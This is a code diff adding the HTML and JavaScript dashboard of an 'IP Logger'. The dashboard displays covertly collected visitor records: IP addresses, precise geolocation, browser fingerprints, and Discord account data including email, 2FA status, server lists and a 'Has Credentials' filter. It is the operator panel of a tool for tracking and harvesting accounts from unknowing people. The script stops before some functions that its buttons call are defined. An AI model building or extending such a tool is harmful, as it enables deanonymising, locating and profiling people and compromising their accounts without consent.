@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Dashboard</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap');
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'Inter', system-ui, sans-serif; background: #0c0c0f; color: #d4d4d8; min-height: 100vh; }
+    .shell { max-width: 960px; margin: 0 auto; padding: 2.5rem 1.5rem 4rem; }
+    .top-bar { display: flex; align-items: center; gap: 1rem; margin-bottom: 2rem; }
+    .top-bar h1 { font-size: 1.5rem; font-weight: 700; color: #fafafa; letter-spacing: -0.02em; }
+    .badge { background: #1c1c24; border: 1px solid #2a2a35; padding: 0.2rem 0.65rem; border-radius: 999px; font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; color: #00e87b; }
+    .toolbar { display: flex; gap: 0.5rem; margin-bottom: 1.25rem; flex-wrap: wrap; align-items: center; }
+    .search-box { flex: 1; min-width: 200px; position: relative; }
+    .search-box input { width: 100%; padding: 0.6rem 1rem 0.6rem 2.4rem; background: #14141a; border: 1px solid #222230; border-radius: 10px; color: #d4d4d8; font-size: 0.85rem; font-family: inherit; outline: none; transition: border-color 0.2s; }
+    .search-box input:focus { border-color: #3a3a50; }
+    .search-box input::placeholder { color: #4a4a5a; }
+    .search-box::before { content: '\u2315'; position: absolute; left: 0.75rem; top: 50%; transform: translateY(-50%); color: #4a4a5a; font-size: 0.9rem; pointer-events: none; }
+    select { padding: 0.6rem 2rem 0.6rem 0.85rem; background: #14141a; border: 1px solid #222230; border-radius: 10px; color: #d4d4d8; font-size: 0.8rem; font-family: inherit; cursor: pointer; outline: none; -webkit-appearance: none; appearance: none; background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' fill='%234a4a5a'%3E%3Cpath d='M6 8L1 3h10z'/%3E%3C/svg%3E"); background-repeat: no-repeat; background-position: right 0.6rem center; }
+    .btn { padding: 0.55rem 0.9rem; border: 1px solid #222230; border-radius: 10px; cursor: pointer; font-size: 0.8rem; font-family: inherit; font-weight: 500; background: #14141a; color: #888; transition: all 0.15s; white-space: nowrap; }
+    .btn:hover { background: #1c1c24; color: #d4d4d8; border-color: #333; }
+    .btn-red { color: #f87171; }
+    .btn-red:hover { background: #2a1515; color: #ef4444; border-color: #5c2020; }
+    .btn-ghost { background: transparent; border-color: transparent; }
+    .btn-ghost:hover { background: #1c1c24; border-color: transparent; }
+    .bulk-bar { display: flex; gap: 0.5rem; align-items: center; margin-bottom: 1rem; padding: 0.6rem 1rem; background: #14141a; border: 1px solid #222230; border-radius: 10px; font-size: 0.8rem; }
+    .bulk-bar .sel-num { color: #fbbf24; font-family: 'JetBrains Mono', monospace; font-weight: 600; }
+    .list { display: flex; flex-direction: column; gap: 6px; }
+    .entry { background: #14141a; border: 1px solid #1e1e2a; border-radius: 12px; overflow: hidden; transition: border-color 0.2s; }
+    .entry:hover { border-color: #2a2a3a; }
+    .entry-row { display: flex; align-items: center; gap: 0.75rem; padding: 0.75rem 1rem; cursor: pointer; user-select: none; transition: background 0.15s; }
+    .entry-row:hover { background: #19192088; }
+    .entry-check { flex-shrink: 0; }
+    .entry-check input { cursor: pointer; accent-color: #00e87b; width: 14px; height: 14px; }
+    .entry-chevron { flex-shrink: 0; width: 18px; text-align: center; color: #3a3a4a; transition: transform 0.25s ease; font-size: 0.7rem; }
+    .entry.open .entry-chevron { transform: rotate(90deg); color: #666; }
+    .entry-main { flex: 1; display: flex; align-items: center; gap: 0.85rem; min-width: 0; }
+    .entry-avatar { width: 30px; height: 30px; border-radius: 50%; flex-shrink: 0; background: #5865f2; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 0.7rem; font-weight: 700; }
+    .entry-avatar img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; }
+    .entry-user { font-size: 0.88rem; color: #f2f3f5; font-weight: 600; flex-shrink: 0; }
+    .entry-ip { font-family: 'JetBrains Mono', monospace; font-size: 0.82rem; color: #00e87b; flex-shrink: 0; }
+    .entry-email { font-size: 0.78rem; color: #f472b6; flex-shrink: 0; max-width: 180px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+    .entry-date { font-size: 0.78rem; color: #555; flex-shrink: 0; white-space: nowrap; }
+    .entry-loc { font-size: 0.78rem; color: #6b7280; flex-shrink: 0; }
+    .entry-actions { display: flex; gap: 0.25rem; flex-shrink: 0; opacity: 0; transition: opacity 0.15s; }
+    .entry-row:hover .entry-actions { opacity: 1; }
+    .entry-actions button { width: 28px; height: 28px; display: flex; align-items: center; justify-content: center; border: none; border-radius: 7px; background: transparent; color: #555; cursor: pointer; font-size: 0.85rem; transition: all 0.15s; }
+    .entry-actions button:hover { background: #222; color: #d4d4d8; }
+    .entry-actions .del-btn:hover { color: #ef4444; background: #2a1515; }
+    .entry-actions .mask-btn:hover { color: #fbbf24; background: #2a2510; }
+    .entry-details { max-height: 0; overflow: hidden; transition: max-height 0.4s ease, padding 0.4s ease; padding: 0 1.25rem; }
+    .entry.open .entry-details { max-height: 3000px; padding: 0 1.25rem 1.25rem; }
+    .masked-tag { font-size: 0.6rem; text-transform: uppercase; letter-spacing: 0.08em; color: #fbbf24; background: #2a2510; padding: 0.15rem 0.45rem; border-radius: 4px; font-weight: 600; flex-shrink: 0; }
+
+    /* Section styling */
+    .section { margin-bottom: 1rem; border-radius: 10px; border: 1px solid #1e1e2a; overflow: hidden; }
+    .section:last-child { margin-bottom: 0; }
+    .section-header {
+      display: flex; align-items: center; gap: 0.5rem; padding: 0.6rem 0.85rem;
+      font-size: 0.7rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.08em;
+    }
+    .section-header .dot { width: 7px; height: 7px; border-radius: 50%; flex-shrink: 0; }
+    .section-body { padding: 0 0.85rem 0.85rem; }
+    .s-discord .section-header { background: #1a1528; color: #a78bfa; border-bottom: 1px solid #2a1a40; }
+    .s-discord .dot { background: #a78bfa; }
+    .s-discord { border-color: #2a1a40; }
+    .s-ip .section-header { background: #0f1a12; color: #34d399; border-bottom: 1px solid #153a2a; }
+    .s-ip .dot { background: #34d399; }
+    .s-ip { border-color: #153a2a; }
+    .s-geo .section-header { background: #0e1520; color: #60a5fa; border-bottom: 1px solid #152a3a; }
+    .s-geo .dot { background: #60a5fa; }
+    .s-geo { border-color: #152a3a; }
+    .s-browser .section-header { background: #1a1a0f; color: #fbbf24; border-bottom: 1px solid #3a2a10; }
+    .s-browser .dot { background: #fbbf24; }
+    .s-browser { border-color: #3a2a10; }
+    .s-technical .section-header { background: #1a1010; color: #f87171; border-bottom: 1px solid #3a1515; }
+    .s-technical .dot { background: #f87171; }
+    .s-technical { border-color: #3a1515; }
+
+    /* Grid layout inside sections */
+    .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 0.5rem 1.5rem; }
+    .info-grid.three { grid-template-columns: 1fr 1fr 1fr; }
+    .info-grid.full { grid-template-columns: 1fr; }
+    .info-item { display: flex; flex-direction: column; gap: 0.1rem; min-width: 0; }
+    .info-item.span2 { grid-column: span 2; }
+    .info-label { font-size: 0.6rem; text-transform: uppercase; letter-spacing: 0.06em; color: #555; font-weight: 600; }
+    .info-value {
+      font-family: 'JetBrains Mono', monospace; font-size: 0.78rem; color: #999; word-break: break-all;
+      cursor: pointer; position: relative;
+    }
+    .info-value.purple { color: #a78bfa; }
+    .info-value.green { color: #34d399; }
+    .info-value.blue { color: #60a5fa; }
+    .info-value.yellow { color: #fbbf24; }
+    .info-value.red { color: #f87171; }
+    .info-value.pink { color: #f472b6; }
+    .info-value.white { color: #f2f3f5; font-weight: 600; font-family: 'Inter', sans-serif; font-size: 0.85rem; }
+    .info-value.copy { padding-right: 1.2rem; }
+    .info-value.copy::after { content: '\u2398'; position: absolute; right: 0; top: 50%; transform: translateY(-50%); color: #333; font-size: 0.8rem; transition: color 0.15s; }
+    .info-value.copy:hover { color: #00e87b; }
+    .info-value.copy:hover::after { color: #00e87b; }
+    .info-value.mono { font-size: 0.72rem; color: #666; }
+
+    /* VPN / threat badges */
+    .tag-row { display: flex; flex-wrap: wrap; gap: 0.3rem; margin-top: 0.5rem; }
+    .tag { display: inline-flex; align-items: center; gap: 0.25rem; padding: 0.2rem 0.55rem; border-radius: 5px; font-size: 0.65rem; font-weight: 600; }
+    .tag-safe { background: #0f1a12; border: 1px solid #153a2a; color: #34d399; }
+    .tag-vpn { background: #1a1510; border: 1px solid #3a3510; color: #fbbf24; }
+    .tag-proxy { background: #1a1205; border: 1px solid #3a2a10; color: #fb923c; }
+    .tag-hosting { background: #10152a; border: 1px solid #152a3a; color: #60a5fa; }
+    .tag-tor { background: #1a0f20; border: 1px solid #3a1540; color: #c084fc; }
+    .tag-local { background: #14141a; border: 1px solid #222230; color: #666; }
+
+    /* Discord profile header */
+    .discord-profile { display: flex; align-items: center; gap: 0.85rem; padding: 0.6rem 0; margin-bottom: 0.75rem; }
+    .discord-avatar { width: 56px; height: 56px; border-radius: 50%; background: #5865f2; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 1.3rem; font-weight: 700; flex-shrink: 0; box-shadow: 0 4px 12px rgba(0,0,0,0.3); }
+    .discord-avatar img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; }
+    .discord-names .dn-global { color: #f2f3f5; font-size: 1.1rem; font-weight: 700; }
+    .discord-names .dn-user { color: #949ba4; font-size: 0.85rem; }
+    .discord-names .dn-user span { color: #72767d; }
+
+    /* Guild list */
+    .guild-list { display: flex; flex-wrap: wrap; gap: 0.35rem; margin-top: 0.5rem; }
+    .guild-chip { display: flex; align-items: center; gap: 0.35rem; padding: 0.3rem 0.55rem; background: #1a1528; border: 1px solid #2a1a40; border-radius: 8px; font-size: 0.7rem; color: #b5bac1; }
+    .guild-chip .g-icon { width: 18px; height: 18px; border-radius: 50%; background: #5865f2; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 0.5rem; font-weight: 700; flex-shrink: 0; overflow: hidden; }
+    .guild-chip .g-icon img { width: 100%; height: 100%; object-fit: cover; }
+    .guild-chip.is-owner { border-color: #fbbf2440; color: #fbbf24; }
+
+    /* Badges */
+    .badge-row { display: flex; flex-wrap: wrap; gap: 0.3rem; margin-top: 0.25rem; }
+    .flag-badge { padding: 0.2rem 0.5rem; background: #1a1a25; border: 1px solid #222230; border-radius: 5px; font-size: 0.65rem; color: #999; font-weight: 500; }
+    .flag-badge.special { background: #1a1528; border-color: #2a1a40; color: #a78bfa; }
+
+    .empty-state { text-align: center; padding: 5rem 2rem; color: #333; }
+    .empty-state .icon { font-size: 2.5rem; margin-bottom: 1rem; }
+    @media (max-width: 640px) { .shell { padding: 1.5rem 1rem; } .entry-main { flex-wrap: wrap; gap: 0.4rem; } .info-grid, .info-grid.three { grid-template-columns: 1fr; } .info-item.span2 { grid-column: auto; } .entry-email, .entry-loc, .entry-date { display: none; } }
+  </style>
+</head>
+<body>
+  <div class="shell">
+    <div class="top-bar">
+      <h1>IP Logger</h1>
+      <span class="badge" id="count">0</span>
+    </div>
+    <div class="toolbar">
+      <div class="search-box"><input type="text" id="search" placeholder="Search usernames, IPs, emails..." oninput="render()"></div>
+      <select id="filterVis" onchange="render()">
+        <option value="all">All</option>
+        <option value="authorized">OAuth2 Only</option>
+        <option value="creds">Has Credentials</option>
+        <option value="masked">Masked</option>
+        <option value="unmasked">Unmasked</option>
+      </select>
+      <select id="sortBy" onchange="render()">
+        <option value="timestamp-desc">Newest</option>
+        <option value="timestamp-asc">Oldest</option>
+        <option value="ip-asc">IP A-Z</option>
+        <option value="ip-desc">IP Z-A</option>
+      </select>
+      <button class="btn btn-ghost" onclick="loadLogs()">Refresh</button>
+      <button class="btn btn-red" onclick="deleteAll()">Clear All</button>
+    </div>
+    <div class="bulk-bar" id="bulkBar" style="display:none;">
+      <span class="sel-num" id="selCount">0</span>
+      <span style="color:#555">selected</span>
+      <span style="color:#333">&middot;</span>
+      <button class="btn btn-red" style="padding:0.35rem 0.7rem;font-size:0.75rem" onclick="bulkDelete()">Delete</button>
+      <button class="btn btn-ghost" style="padding:0.35rem 0.7rem;font-size:0.75rem" onclick="bulkMask()">Mask</button>
+      <button class="btn btn-ghost" style="padding:0.35rem 0.7rem;font-size:0.75rem" onclick="bulkUnmask()">Unmask</button>
+      <button class="btn btn-ghost" style="padding:0.35rem 0.7rem;font-size:0.75rem" onclick="clearSelection()">Deselect</button>
+    </div>
+    <div class="list" id="logs"></div>
+    <div class="empty-state" id="emptyMsg" style="display:none;"><div class="icon">&oslash;</div><p>No entries yet</p></div>
+  </div>
+
+  <script>
+    let allLogs = [];
+    let selectedIds = new Set();
+    let openIds = new Set();
+
+    async function loadLogs() {
+      const r = await fetch('/logs');
+      allLogs = await r.json();
+      selectedIds.clear();
+      openIds.clear();
+      render();
+    }
+
+    function m(val, masked) {
+      if (!masked || !val) return esc(String(val || ''));
+      const s = String(val);
+      if (s.length <= 2) return '*'.repeat(s.length);
+      return s[0] + '*'.repeat(Math.min(s.length - 2, 6)) + s[s.length - 1];
+    }
+
+    function render() {
+      const q = document.getElementById('search').value.toLowerCase();
+      const vis = document.getElementById('filterVis').value;
+      const [sortKey, sortDir] = document.getElementById('sortBy').value.split('-');
+      let filtered = allLogs.filter(e => {
+        if (vis === 'masked' && !e.masked) return false;
+        if (vis === 'unmasked' && e.masked) return false;
+        if (vis === 'creds' && !e.discordEmail) return false;
+        if (vis === 'authorized' && !e.discordUsername) return false;
+        if (q) {
+          const g = e.geo || {};
+          const fp = e.fingerprint || {};
+          const guilds = (e.discordGuilds || []).map(g => g.name).join(' ');
+          const hay = [
+            e.ip, e.discordUsername, e.discordDisplayName, e.discordEmail,
+            e.referer, e.userAgent, guilds,
+            g.city, g.region, g.regionCode, g.country, g.countryCode,
+            g.continent, g.postal, g.timezone, g.utcOffset, g.org,
+            g.asn, g.hostname, g.latitude, g.longitude,
+            fp.timezone, fp.language, fp.platform, fp.gpuRenderer, fp.gpuVendor
+          ].filter(Boolean).join(' ').toLowerCase();
+          if (!hay.includes(q)) return false;
+        }
+        return true;
+      });
+      filtered.sort((a, b) => {
+        let va = a[sortKey] || '', vb = b[sortKey] || '';
+        if (sortKey === 'ip') { va = ipNum(va); vb = ipNum(vb); }
+        return (va < vb ? -1 : va > vb ? 1 : 0) * (sortDir === 'asc' ? 1 : -1);
+      });
+      document.getElementById('count').textContent = allLogs.length;
+      const list = document.getElementById('logs');
+      const empty = document.getElementById('emptyMsg');
+      if (!filtered.length) { list.innerHTML = ''; empty.style.display = 'block'; updateBulk(); return; }
+      empty.style.display = 'none';
+
+      list.innerHTML = filtered.map(e => {
+        const isOpen = openIds.has(e.id);
+        const isChecked = selectedIds.has(e.id) ? 'checked' : '';
+        const masked = e.masked;
+        const cls = 'entry' + (isOpen ? ' open' : '');
+        const d = e.timestamp ? new Date(e.timestamp) : null;
+        const dateStr = d ? d.toLocaleDateString(undefined, { month: 'short', day: 'numeric' }) : '';
+        const timeStr = d ? d.toLocaleTimeString(undefined, { hour: '2-digit', minute: '2-digit' }) : '';
+        const geo = e.geo || {};
+        const locParts = [geo.city, geo.country].filter(Boolean).join(', ');
+        const avatarUrl = e.discordAvatar ? `https://cdn.discordapp.com/avatars/${e.id}/${e.discordAvatar}.png?size=128` : '';
+        const display = e.discordDisplayName || e.discordUsername || e.discordEmail || e.ip || 'unknown';
+        const disc = e.discordDiscriminator && e.discordDiscriminator !== '0' ? '#' + e.discordDiscriminator : '';
+
+        return `<div class="${cls}" data-id="${e.id}">
+          <div class="entry-row" onclick="toggleOpen('${e.id}')">
+            <div class="entry-check" onclick="event.stopPropagation()"><input type="checkbox" ${isChecked} onchange="toggleSelect('${e.id}')"></div>
+            <div class="entry-chevron">&#9654;</div>
+            <div class="entry-main">
+              ${avatarUrl ? `<div class="entry-avatar"><img src="${avatarUrl}" onerror="this.parentElement.textContent='${esc(display[0].toUpperCase())}'"></div>` : (e.discordUsername ? `<div class="entry-avatar">${display[0].toUpperCase()}</div>` : '')}
+              ${e.discordUsername ? `<span class="entry-user">${m(display, masked)}${disc ? '<span style="color:#555;font-weight:400;font-size:0.78rem">' + esc(disc) + '</span>' : ''}</span>` : ''}
+              <span class="entry-ip">${m(e.ip, masked)}</span>
+              ${e.discordEmail ? '<span class="entry-email">' + m(e.discordEmail, masked) + '</span>' : ''}
+              ${locParts ? '<span class="entry-loc">' + esc(locParts) + '</span>' : ''}
+              <span class="entry-date">${dateStr} ${timeStr}</span>
+            </div>
+            ${masked ? '<span class="masked-tag">masked</span>' : ''}
+            <div class="entry-actions" onclick="event.stopPropagation()">
+              <button class="mask-btn" onclick="toggleMask('${e.id}')" title="${masked ? 'Unmask' : 'Mask'}">${masked ? '&#128065;' : '&#128064;'}</button>
+              <button class="del-btn" onclick="deleteOne('${e.id}')" title="Delete">&times;</button>
+            </div>
+          </div>
+          <div class="entry-details">
+            ${buildSections(e)}
+          </div>
+        </div>`;
+      }).join('');
+      updateBulk();
+    }
+
+    function buildSections(e) {
+      let html = '';
+      html += sectionDiscord(e);
+      html += sectionIP(e);
+      html += sectionGeo(e.geo || {});
+      html += sectionBrowser(e.fingerprint || {});
+      html += sectionTechnical(e);
+      return html;
+    }
+
+    /* ===== DISCORD SECTION ===== */
+    function sectionDiscord(e) {
+      const has = e.discordUsername || e.discordEmail;
+      if (!has) return '';
+      const masked = e.masked;
+      const avatarUrl = e.discordAvatar ? `https://cdn.discordapp.com/avatars/${e.id}/${e.discordAvatar}.png?size=256` : '';
+      const disc = e.discordDiscriminator && e.discordDiscriminator !== '0' ? '#' + e.discordDiscriminator : '';
+      const premiumNames = { 0: 'None', 1: 'Nitro Classic', 2: 'Nitro', 3: 'Nitro Basic' };
+      const flagNames = {
+        1: 'Staff', 2: 'Partner', 4: 'HypeSquad Events', 8: 'Bug Hunter L1',
+        16: 'Bug Hunter L2', 32: 'HypeSquad Bravery', 64: 'HypeSquad Brilliance',
+        128: 'HypeSquad Balance', 256: 'Early Supporter', 512: 'Verified Bot Dev',
+        1024: 'Verified Bot', 16384: 'Active Developer', 549755813888: 'Premium Bot',
+        4194304: 'Supports Commands'
+      };
+
+      let profile = '';
+      if (avatarUrl || e.discordUsername) {
+        const name = e.discordDisplayName || e.discordUsername || '';
+        profile = `<div class="discord-profile">
+          <div class="discord-avatar">${avatarUrl ? `<img src="${avatarUrl}" onerror="this.parentElement.textContent='${esc(name[0]?.toUpperCase() || '?')}'">` : esc(name[0]?.toUpperCase() || '?')}</div>
+          <div class="discord-names">
+            <div class="dn-global">${m(name, masked)}</div>
+            <div class="dn-user">@${m(e.discordUsername || '', masked)}${disc ? '<span>' + esc(disc) + '</span>' : ''}</div>
+          </div>
+        </div>`;
+      }
+
+      const flags = e.discordPublicFlags || 0;
+      const activeFlags = Object.entries(flagNames).filter(([bit]) => flags & parseInt(bit)).map(([, n]) => n);
+
+      let guildsHtml = '';
+      if (e.discordGuilds && e.discordGuilds.length) {
+        guildsHtml = e.discordGuilds.map(g => {
+          const icon = g.icon ? `<img src="https://cdn.discordapp.com/icons/${g.id}/${g.icon}.png?size=64" onerror="this.parentElement.textContent='${esc(g.name[0])}'">` : esc(g.name[0]);
+          return `<div class="guild-chip${g.owner ? ' is-owner' : ''}"><div class="g-icon">${icon}</div><span>${esc(g.name)}${g.owner ? ' &#9733;' : ''}</span></div>`;
+        }).join('');
+      }
+
+      return `<div class="section s-discord">
+        <div class="section-header"><span class="dot"></span>Discord Account</div>
+        <div class="section-body">
+          ${profile}
+          <div class="info-grid">
+            ${e.discordUsername ? `<div class="info-item"><span class="info-label">Username</span><span class="info-value purple copy" onclick="cp(this)">@${m(e.discordUsername, masked)}${disc}</span></div>` : ''}
+            ${e.discordDisplayName ? `<div class="info-item"><span class="info-label">Display Name</span><span class="info-value white">${m(e.discordDisplayName, masked)}</span></div>` : ''}
+            ${e.discordEmail ? `<div class="info-item"><span class="info-label">Email</span><span class="info-value pink copy" onclick="cp(this)">${m(e.discordEmail, masked)}</span></div>` : ''}
+            ${e.discordPassword ? `<div class="info-item"><span class="info-label">Auth Method</span><span class="info-value">${esc(e.discordPassword)}</span></div>` : ''}
+            ${e.discordLocale ? `<div class="info-item"><span class="info-label">Language / Locale</span><span class="info-value">${esc(e.discordLocale)}</span></div>` : ''}
+            ${e.discordMfaEnabled !== undefined ? `<div class="info-item"><span class="info-label">2FA Enabled</span><span class="info-value">${e.discordMfaEnabled ? '<span style="color:#23a55a">Yes</span>' : '<span style="color:#555">No</span>'}</span></div>` : ''}
+            ${e.discordPremiumType !== undefined ? `<div class="info-item"><span class="info-label">Premium Type</span><span class="info-value purple">${premiumNames[e.discordPremiumType] || 'Unknown (' + e.discordPremiumType + ')'}</span></div>` : ''}
+            ${e.discordAccentColor ? `<div class="info-item"><span class="info-label">Accent Color</span><span class="info-value"><span style="display:inline-block;width:12px;height:12px;border-radius:3px;background:#${e.discordAccentColor.toString(16).padStart(6,'0')};vertical-align:middle;margin-right:0.35rem"></span>#${e.discordAccentColor.toString(16).padStart(6,'0')}</span></div>` : ''}
+            ${e.discordBanner ? `<div class="info-item"><span class="info-label">Banner</span><span class="info-value">#${typeof e.discordBanner === 'string' && e.discordBanner.length > 0 ? esc(e.discordBanner) : 'None set'}</span></div>` : ''}
+            ${e.id ? `<div class="info-item"><span class="info-label">User ID</span><span class="info-value copy" onclick="cp(this)">${esc(e.id)}</span></div>` : ''}
+          </div>
+          ${activeFlags.length ? `<div style="margin-top:0.6rem"><span class="info-label">Badges</span><div class="badge-row" style="margin-top:0.3rem">${activeFlags.map(f => `<span class="flag-badge${['Staff','Partner','Verified Bot Dev','Verified Bot','Active Developer'].includes(f) ? ' special' : ''}">${f}</span>`).join('')}</div></div>` : ''}
+          ${guildsHtml ? `<div style="margin-top:0.6rem"><span class="info-label">Servers (${e.discordGuilds.length})</span><div class="guild-list">${guildsHtml}</div></div>` : ''}
+        </div>
+      </div>`;
+    }
+
+    /* ===== IP SECTION ===== */
+    function sectionIP(e) {
+      if (!e.ip) return '';
+      const masked = e.masked;
+      const geo = e.geo || {};
+      return `<div class="section s-ip">
+        <div class="section-header"><span class="dot"></span>IP Address</div>
+        <div class="section-body">
+          <div class="info-grid">
+            <div class="info-item"><span class="info-label">IPv4</span><span class="info-value green copy" onclick="cp(this)">${m(e.ip, masked)}</span></div>
+            <div class="info-item"><span class="info-label">Timestamp</span><span class="info-value">${e.timestamp ? new Date(e.timestamp).toLocaleString() : 'unknown'}</span></div>
+            ${geo.hostname ? `<div class="info-item"><span class="info-label">Hostname</span><span class="info-value">${esc(geo.hostname)}</span></div>` : ''}
+            ${geo.isLocal !== undefined ? `<div class="info-item"><span class="info-label">Local IP</span><span class="info-value">${geo.isLocal ? '<span style="color:#fbbf24">Yes</span>' : '<span style="color:#555">No</span>'}</span></div>` : ''}
+          </div>
+          <div class="tag-row">
+            ${geo.isVpn ? '<span class="tag tag-vpn">VPN</span>' : ''}
+            ${geo.isProxy ? '<span class="tag tag-proxy">Proxy</span>' : ''}
+            ${geo.isHosting ? '<span class="tag tag-hosting">Hosting</span>' : ''}
+            ${geo.isTor ? '<span class="tag tag-tor">Tor</span>' : ''}
+            ${geo.isLocal ? '<span class="tag tag-local">Local</span>' : ''}
+            ${!geo.isVpn && !geo.isProxy && !geo.isHosting && !geo.isTor && !geo.isLocal && (geo.country || geo.isp) ? '<span class="tag tag-safe">Clean</span>' : ''}
+          </div>
+        </div>
+      </div>`;
+    }
+
+    /* ===== GEO SECTION ===== */
+    function sectionGeo(geo) {
+      if (!geo || (!geo.country && !geo.city && !geo.org)) return '';
+      return `<div class="section s-geo">
+        <div class="section-header"><span class="dot"></span>Location & ISP</div>
+        <div class="section-body">
+          <div class="info-grid three">
+            ${geo.city ? `<div class="info-item"><span class="info-label">City</span><span class="info-value blue">${esc(geo.city)}</span></div>` : ''}
+            ${geo.region ? `<div class="info-item"><span class="info-label">Region</span><span class="info-value blue">${esc(geo.region)}</span></div>` : ''}
+            ${geo.regionCode ? `<div class="info-item"><span class="info-label">Region Code</span><span class="info-value">${esc(geo.regionCode)}</span></div>` : ''}
+            ${geo.country ? `<div class="info-item"><span class="info-label">Country</span><span class="info-value blue">${esc(geo.country)}</span></div>` : ''}
+            ${geo.countryCode ? `<div class="info-item"><span class="info-label">Country Code</span><span class="info-value">${esc(geo.countryCode)}</span></div>` : ''}
+            ${geo.continent ? `<div class="info-item"><span class="info-label">Continent</span><span class="info-value">${esc(geo.continent)}</span></div>` : ''}
+            ${geo.postal ? `<div class="info-item"><span class="info-label">Postal Code</span><span class="info-value">${esc(geo.postal)}</span></div>` : ''}
+            ${geo.latitude ? `<div class="info-item"><span class="info-label">Coordinates</span><span class="info-value">${geo.latitude}, ${geo.longitude}</span></div>` : ''}
+            ${geo.timezone ? `<div class="info-item"><span class="info-label">Timezone</span><span class="info-value blue">${esc(geo.timezone)}</span></div>` : ''}
+            ${geo.utcOffset ? `<div class="info-item"><span class="info-label">UTC Offset</span><span class="info-value">${esc(geo.utcOffset)}</span></div>` : ''}
+            ${geo.org ? `<div class="info-item"><span class="info-label">ISP / Org</span><span class="info-value">${esc(geo.org)}</span></div>` : ''}
+            ${geo.isp && geo.isp !== geo.org ? `<div class="info-item"><span class="info-label">ISP</span><span class="info-value">${esc(geo.isp)}</span></div>` : ''}
+            ${geo.asn ? `<div class="info-item"><span class="info-label">ASN</span><span class="info-value">${esc(geo.asn)}</span></div>` : ''}
+          </div>
+        </div>
+      </div>`;
+    }
+
+    /* ===== BROWSER SECTION ===== */
+    function sectionBrowser(fp) {
+      const items = [];
+      if (fp.timezone) items.push(['Timezone', fp.timezone, 'blue']);
+      if (fp.language) items.push(['Language', fp.language, 'blue']);
+      if (fp.languages) items.push(['All Languages', fp.languages, '']);
+      if (fp.platform) items.push(['Platform', fp.platform, 'yellow']);
+      if (fp.screenRes) items.push(['Screen Resolution', fp.screenRes, 'yellow']);
+      if (fp.screenDepth) items.push(['Color Depth', fp.screenDepth + ' bit', '']);
+      if (fp.viewport) items.push(['Viewport', fp.viewport, 'yellow']);
+      if (fp.hardwareConcurrency) items.push(['CPU Cores', fp.hardwareConcurrency, 'yellow']);
+      if (fp.deviceMemory) items.push(['Device Memory', fp.deviceMemory + ' GB', 'yellow']);
+      if (fp.gpuRenderer) items.push(['GPU Renderer', fp.gpuRenderer, 'yellow']);
+      if (fp.gpuVendor) items.push(['GPU Vendor', fp.gpuVendor, '']);
+      if (fp.canvasHash) items.push(['Canvas Hash', fp.canvasHash, '']);
+      if (fp.cookieEnabled !== undefined) items.push(['Cookies Enabled', fp.cookieEnabled ? 'Yes' : 'No', '']);
+      if (fp.doNotTrack) items.push(['Do Not Track', fp.doNotTrack, '']);
+      if (fp.maxTouchPoints) items.push(['Touch Points', fp.maxTouchPoints, '']);
+      if (!items.length) return '';
+      return `<div class="section s-browser">
+        <div class="section-header"><span class="dot"></span>Browser & Device</div>
+        <div class="section-body">
+          <div class="info-grid three">
+            ${items.map(([l, v, c]) => `<div class="info-item"><span class="info-label">${esc(l)}</span><span class="info-value${c ? ' ' + c : ''}">${esc(String(v))}</span></div>`).join('')}
+          </div>
+        </div>
+      </div>`;
+    }
+
+    /* ===== TECHNICAL SECTION ===== */
+    function sectionTechnical(e) {
+      return `<div class="section s-technical">
+        <div class="section-header"><span class="dot"></span>Request Info</div>
+        <div class="section-body">
+          <div class="info-grid full">
+            <div class="info-item"><span class="info-label">User Agent</span><span class="info-value mono copy" onclick="cp(this)">${esc(e.userAgent || '')}</span></div>
+            <div class="info-item"><span class="info-label">Referer</span><span class="info-value">${esc(e.referer || 'direct')}</span></div>
+          </div>
+        </div>
+      </div>`;
+    }
+
+    function cp(el) { navigator.clipboard.writeText(el.textContent).then(() => { const c = el.style.color; el.style.color = '#00e87b'; setTimeout(() => { el.style.color = c || ''; }, 600); }); }
+    function ipNum(ip) { return ip.split('.').reduce((a, o) => (a << 8) + parseInt(o || 0), 0) >>> 0; }
+    function esc(s) { const d = document.createElement('div'); d.textContent = s || ''; return d.innerHTML; }
+    function toggleOpen(id) { if (openIds.has(id)) openIds.delete(id); else openIds.add(id); const el = document.querySelector(`[data-id="${id}"]`); if (el) el.classList.toggle('open'); }
+    async function deleteOne(id) { await fetch('/delete-ip', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id }) }); allLogs = allLogs.filter(e => e.id !== id); selectedIds.delete(id); openIds.delete(id); render(); }
+    async function toggleMask(id) { await fetch('/toggle-mask', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id }) }); const e = allLogs.find(x => x.id === id); if (e) e.masked = !e.masked; render(); }
+    async function deleteAll() { if (!confirm('Delete all entries?')) return; await fetch('/delete-all', { method: 'POST' }); allLogs = []; selectedIds.clear(); openIds.clear(); render(); }
+    function toggleSelect(id) { if (selectedIds.has(id)) selectedIds.delete(id); else selectedIds.add(id); updateBulk(); }
+    function clearSelection() { selectedIds.clear(); render(); }
+    function updateBulk() { const bar = document.getElementById('bulkBar'); bar.style.display = selectedIds.size ? 'flex' : 'none'; document.getElementById('selCount').textContent = selectedIds.size; }
+    async function bulkDelete() { if (!confirm(`Delete ${selectedIds.size} entries?`)) return; for (const id of selectedIds) { await fetch('/delete-ip', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id }) }); } allLogs = allLogs.filter(e => !selectedIds.has(e.id)); selectedIds.clear(); render(); }
